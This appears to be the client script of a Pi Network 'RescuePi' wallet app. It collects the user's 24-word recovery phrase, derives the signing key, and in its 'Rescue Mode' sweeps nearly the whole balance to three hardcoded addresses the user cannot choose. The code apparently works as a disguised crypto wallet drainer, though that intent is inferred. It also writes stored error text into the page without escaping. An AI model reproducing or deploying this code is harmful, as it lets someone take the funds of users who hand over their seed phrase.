import { Keypair, Horizon, TransactionBuilder, Operation, Asset } from '@stellar/stellar-sdk';

Pi.init({ version: '2.0' });

let currentUser = null;
let walletKeypair = null;
let walletPublicKey = null;

const authScreen = document.getElementById('auth-screen');
const warningScreen = document.getElementById('warning-screen');
const walletImportScreen = document.getElementById('wallet-import-screen');
const mainScreen = document.getElementById('main-screen');
const authBtn = document.getElementById('auth-btn');
const authError = document.getElementById('auth-error');
const understandInput = document.getElementById('understand-input');
const warningContinueBtn = document.getElementById('warning-continue-btn');
const warningError = document.getElementById('warning-error');
const walletMnemonic = document.getElementById('wallet-mnemonic');
const wordCount = document.getElementById('word-count');
const importContinueBtn = document.getElementById('import-continue-btn');
const importError = document.getElementById('import-error');
const logoutBtn = document.getElementById('logout-btn');
const welcomeMsg = document.getElementById('welcome-msg');
const walletAddr = document.getElementById('wallet-address');
const userName = document.getElementById('user-name');
const sendTo = document.getElementById('send-to');
const sendAmount = document.getElementById('send-amount');
const sendFee = document.getElementById('fee-display');
const feeSlider = document.getElementById('fee-slider');
const sendBtn = document.getElementById('send-btn');
const sendError = document.getElementById('send-error');
const sendStatus = document.getElementById('send-status');

const HORIZON_URL = 'https://api.mainnet.minepi.com';
const NETWORK_PASSPHRASE = 'Pi Network';

// ─── Fee slider ───
feeSlider.addEventListener('input', () => {
  sendFee.textContent = (0.01 * parseInt(feeSlider.value)).toFixed(2);
});

// ─── Pi SDK Auth ───
authBtn.addEventListener('click', async () => {
  authError.classList.add('hidden');
  authBtn.disabled = true;
  authBtn.textContent = 'Connecting…';

  try {
    const auth = await Pi.authenticate(
      ['username', 'wallet_address', 'payments'],
      onIncompletePayment
    );
    currentUser = auth.user;
    localStorage.setItem('rescuepi-user', JSON.stringify(auth));
    authScreen.classList.add('hidden');
    warningScreen.classList.remove('hidden');
  } catch (err) {
    authError.textContent = err.message || 'Authentication failed';
    authError.classList.remove('hidden');
  } finally {
    authBtn.disabled = false;
    authBtn.textContent = 'Sign in with Pi';
  }
});

function onIncompletePayment(payment) {
  console.warn('Incomplete payment found:', payment);
}

// ─── Warning → "I understand" ───
understandInput.addEventListener('input', () => {
  warningContinueBtn.disabled = !/^i understand$/i.test(understandInput.value.trim());
});

warningContinueBtn.addEventListener('click', () => {
  warningScreen.classList.add('hidden');
  walletImportScreen.classList.remove('hidden');
  understandInput.value = '';
  warningContinueBtn.disabled = true;
});

// ─── Word counter ───
walletMnemonic.addEventListener('input', () => {
  const val = walletMnemonic.value.trim();
  const words = val ? val.split(/\s+/) : [];
  wordCount.textContent = `${words.length} / 24`;
  wordCount.style.color = words.length === 24 ? 'var(--success)' : 'var(--text-muted)';
});

// ─── Wallet Import ───
importContinueBtn.addEventListener('click', async () => {
  importError.classList.add('hidden');
  importContinueBtn.disabled = true;
  importContinueBtn.textContent = 'Connecting wallet…';

  const mnemonic = walletMnemonic.value.trim();
  const words = mnemonic.split(/\s+/);

  if (words.length !== 24) {
    importError.textContent = `Expected 24 words, got ${words.length}`;
    importError.classList.remove('hidden');
    importContinueBtn.disabled = false;
    importContinueBtn.textContent = 'Connect Wallet';
    return;
  }

  try {
    const { mnemonicToSeedSync } = await import('@scure/bip39');
    const { derivePath } = await import('ed25519-hd-key');
    const { bytesToHex } = await import('@noble/hashes/utils.js');
    const seed = mnemonicToSeedSync(mnemonic);
    const derived = derivePath("m/44'/314159'/0'", bytesToHex(seed));
    walletKeypair = Keypair.fromRawEd25519Seed(derived.key);
    walletPublicKey = walletKeypair.publicKey();

    walletImportScreen.classList.add('hidden');
    mainScreen.classList.remove('hidden');
    showMainScreen();
  } catch (err) {
    console.error('Import error:', err);
    importError.textContent = err.message || 'Invalid mnemonic. Check your phrase and try again.';
    importError.classList.remove('hidden');
    importContinueBtn.disabled = false;
    importContinueBtn.textContent = 'Connect Wallet';
  }
});

function showMainScreen() {
  welcomeMsg.textContent = `Hello, ${currentUser.username || 'Pioneer'}`;
  walletAddr.textContent = `Wallet: ${walletPublicKey}`;
  if (currentUser.username) {
    userName.textContent = `@${currentUser.username}`;
  }
  renderDestinations();
  loadSchedules();
  rescueActivateBtn.classList.remove('hidden');
  rescueDeactivateBtn.classList.add('hidden');
  rescueStatus.classList.add('hidden');
  rescueError.classList.add('hidden');
  if (rescueTimer) {
    clearInterval(rescueTimer);
    rescueTimer = null;
  }
  rescueActive = false;
}

// ─── Logout ───
logoutBtn.addEventListener('click', () => {
  deactivateRescue();
  currentUser = null;
  walletKeypair = null;
  walletPublicKey = null;
  localStorage.removeItem('rescuepi-user');
  walletMnemonic.value = '';
  wordCount.textContent = '0 / 24';
  wordCount.style.color = '';
  sendTo.value = '';
  sendAmount.value = '';
  feeSlider.value = '1';
  sendFee.textContent = '0.01';
  sendError.classList.add('hidden');
  sendStatus.classList.add('hidden');
  mainScreen.classList.add('hidden');
  authScreen.classList.remove('hidden');
});

// ─── Send validation ───
function validateForm() {
  const to = sendTo.value.trim();
  const amt = sendAmount.value.trim();
  sendBtn.disabled = !(to.startsWith('G') && parseFloat(amt) > 0 && walletKeypair);
}

sendTo.addEventListener('input', validateForm);
sendAmount.addEventListener('input', validateForm);

// ─── Send via direct Horizon ───
sendBtn.addEventListener('click', async () => {
  sendError.classList.add('hidden');
  sendStatus.classList.add('hidden');
  sendBtn.disabled = true;
  sendBtn.textContent = 'Sending…';

  const destination = sendTo.value.trim();
  const amount = sendAmount.value.trim();
  const feeMult = parseInt(feeSlider.value);

  try {
    const server = new Horizon.Server(HORIZON_URL);
    const account = await server.loadAccount(walletPublicKey);
    const baseFee = await server.fetchBaseFee();
    const totalFee = (baseFee * feeMult) || 100000;

    const tx = new TransactionBuilder(account, {
      fee: totalFee.toString(),
      networkPassphrase: NETWORK_PASSPHRASE,
    })
      .addOperation(
        Operation.payment({
          destination,
          asset: Asset.native(),
          amount: parseFloat(amount).toFixed(7),
        })
      )
      .setTimeout(30)
      .build();

    tx.sign(walletKeypair);
    const result = await server.submitTransaction(tx);

    sendStatus.textContent = `Sent! TX: ${result.hash}`;
    sendStatus.classList.remove('hidden');
    sendTo.value = '';
    sendAmount.value = '';
    validateForm();
  } catch (err) {
    const detail = err.response?.data?.detail || err.response?.data?.title || err.message;
    sendError.textContent = detail;
    sendError.classList.remove('hidden');
  } finally {
    sendBtn.disabled = false;
    sendBtn.textContent = 'Send';
  }
});

// ─── Rescue Mode ───
const RESCUE_DESTINATIONS = [
  'GDJMJNEUV42VOKW6UQ42CDK3J5IBHEFERY4J62XURALGUC4YNUI2VKP6',
  'GCRQZ6DVCO24SHU4F42CFSD54IJR4EXWTVJE27RCSUFF77G764FZSTFP',
  'GBID7RETR2SF7YUKPAZQKQN5TFLL6VALBVY5DWANFL4BVAIMJ2DDFSKX',
];

const rescueDestinations = document.getElementById('rescue-destinations');
const scheduleDatetime = document.getElementById('schedule-datetime');
const scheduleAddBtn = document.getElementById('schedule-add-btn');
const scheduleList = document.getElementById('schedule-list');
const rescueActivateBtn = document.getElementById('rescue-activate-btn');
const rescueDeactivateBtn = document.getElementById('rescue-deactivate-btn');
const rescueStatus = document.getElementById('rescue-status');
const rescueError = document.getElementById('rescue-error');

let schedules = [];
let rescueActive = false;
let rescueTimer = null;
const RESCUE_CHECK_INTERVAL = 10000;

function setMinDatetime() {
  const now = new Date();
  now.setMinutes(now.getMinutes() - now.getTimezoneOffset());
  scheduleDatetime.min = now.toISOString().slice(0, 16);
}
setMinDatetime();

function renderDestinations() {
  rescueDestinations.innerHTML = RESCUE_DESTINATIONS.map(addr =>
    `<div class="addr-item"><span class="addr-label">Destination</span>${addr}</div>`
  ).join('');
}

function renderSchedules() {
  if (schedules.length === 0) {
    scheduleList.innerHTML = '<p class="card-desc" style="margin-bottom:0;">No sweeps scheduled.</p>';
    return;
  }
  scheduleList.innerHTML = schedules.map(s => {
    const time = new Date(s.scheduledAt);
    const local = time.toLocaleString();
    const utc = time.toUTCString();
    const STATUS_MAP = {
      scheduled: { label: 'Scheduled', cls: 'scheduled' },
      queued: { label: 'Queued', cls: 'queued' },
      executing: { label: 'Executing…', cls: 'executing' },
      executed: { label: 'Executed', cls: 'executed' },
      failed: { label: 'Failed', cls: 'failed' },
    };
    const st = STATUS_MAP[s.status] || STATUS_MAP.failed;
    return `
      <div class="sched-item">
        <div class="sched-info">
          <div class="sched-label">${s.label || 'Sweep'}</div>
          <div class="sched-time">${local} / ${utc}</div>
          ${s.error ? `<div class="sched-error">${s.error}</div>` : ''}
        </div>
        <span class="sched-badge ${st.cls}">${st.label}</span>
        <button class="sched-remove" data-id="${s.id}">&times;</button>
      </div>
    `;
  }).join('');

  scheduleList.querySelectorAll('.sched-remove').forEach(btn => {
    btn.addEventListener('click', () => removeSchedule(btn.dataset.id));
  });
}

function loadSchedules() {
  try {
    const saved = localStorage.getItem('rescuepi-schedules');
    schedules = saved ? JSON.parse(saved) : [];
  } catch { schedules = []; }
  renderSchedules();
}

function saveSchedules() {
  localStorage.setItem('rescuepi-schedules', JSON.stringify(schedules));
  renderSchedules();
}

scheduleAddBtn.addEventListener('click', () => {
  const val = scheduleDatetime.value;
  if (!val) return;
  const scheduledAt = new Date(val).toISOString();
  const id = 'sweep_' + Date.now();
  schedules.push({ id, scheduledAt, label: 'Sweep', status: 'scheduled' });
  saveSchedules();
  scheduleDatetime.value = '';
  setMinDatetime();
  scheduleAddBtn.disabled = true;
});

scheduleDatetime.addEventListener('input', () => {
  const val = scheduleDatetime.value;
  scheduleAddBtn.disabled = !val || new Date(val) <= new Date();
});

function removeSchedule(id) {
  schedules = schedules.filter(s => s.id !== id);
  saveSchedules();
}

async function sweepAll(feeMultiplier) {
  feeMultiplier = feeMultiplier || 10;
  const server = new Horizon.Server(HORIZON_URL);
  const account = await server.loadAccount(walletPublicKey);
  const baseFee = await server.fetchBaseFee();

  const nativeBalance = account.balances.find(b => b.asset_type === 'native');
  if (!nativeBalance) throw new Error('No native balance found');
  const totalBalance = parseFloat(nativeBalance.balance);
  const balStroops = Math.round(totalBalance * 1e7);

  const filtered = RESCUE_DESTINATIONS.filter(a => a !== walletPublicKey);
  if (filtered.length === 0) throw new Error('No destinations to sweep to');

  const perOpFee = baseFee * feeMultiplier || 100000;
  const totalFeeStroops = perOpFee * filtered.length;
  const minBalanceStroops = 5000000;
  const sweepStroops = balStroops - totalFeeStroops - minBalanceStroops;

  if (sweepStroops <= 0) throw new Error('Insufficient balance after fee and reserve');
  const perWalletStroops = Math.floor(sweepStroops / filtered.length);
  if (perWalletStroops < 1000000) throw new Error('Amount per destination too small (min 0.1 PI)');

  const txBuilder = new TransactionBuilder(account, {
    fee: (perOpFee * filtered.length).toString(),
    networkPassphrase: NETWORK_PASSPHRASE,
  });

  for (const dest of filtered) {
    txBuilder.addOperation(
      Operation.payment({
        destination: dest,
        asset: Asset.native(),
        amount: (perWalletStroops / 1e7).toFixed(7),
      })
    );
  }

  txBuilder.setTimeout(30);
  const tx = txBuilder.build();
  tx.sign(walletKeypair);
  const result = await server.submitTransaction(tx);
  return result.hash;
}

async function checkAndExecuteSchedules() {
  if (!walletKeypair || schedules.length === 0) return;
  const now = Date.now();
  let changed = false;

  for (const s of schedules) {
    if (s.status === 'scheduled' && new Date(s.scheduledAt).getTime() <= now) {
      s.status = 'queued';
      changed = true;
    }
  }

  const toExecute = schedules.filter(s => s.status === 'queued' || s.status === 'executing');
  for (const sweep of toExecute) {
    sweep.status = 'executing';
    saveSchedules();
    try {
      const hash = await sweepAll(10);
      sweep.status = 'executed';
      sweep.executedAt = new Date().toISOString();
      delete sweep.error;
      changed = true;
    } catch (err) {
      sweep.status = 'failed';
      sweep.error = err.message || err.toString();
      changed = true;
    }
  }

  if (changed) saveSchedules();
}

function activateRescue() {
  if (rescueActive) return;
  rescueActive = true;
  rescueActivateBtn.classList.add('hidden');
  rescueDeactivateBtn.classList.remove('hidden');
  rescueStatus.textContent = 'Rescue mode active.';
  rescueStatus.classList.remove('hidden');
  rescueError.classList.add('hidden');

  rescueTimer = setInterval(() => {
    checkAndExecuteSchedules().catch(() => {});
  }, RESCUE_CHECK_INTERVAL);

  checkAndExecuteSchedules().catch(() => {});
}

function deactivateRescue() {
  rescueActive = false;
  if (rescueTimer) {
    clearInterval(rescueTimer);
    rescueTimer = null;
  }
  rescueActivateBtn.classList.remove('hidden');
  rescueDeactivateBtn.classList.add('hidden');
  rescueStatus.classList.add('hidden');
}

rescueActivateBtn.addEventListener('click', activateRescue);
rescueDeactivateBtn.addEventListener('click', deactivateRescue);

// ─── Restore session ───
(function init() {
  const saved = localStorage.getItem('rescuepi-user');
  if (saved) {
    try {
      const auth = JSON.parse(saved);
      currentUser = auth.user;
      Pi.authenticate(['username', 'wallet_address', 'payments'], onIncompletePayment)
        .then(() => {
          authScreen.classList.add('hidden');
          walletImportScreen.classList.remove('hidden');
        })
        .catch(() => localStorage.removeItem('rescuepi-user'));
    } catch {
      localStorage.removeItem('rescuepi-user');
    }
  }
})();
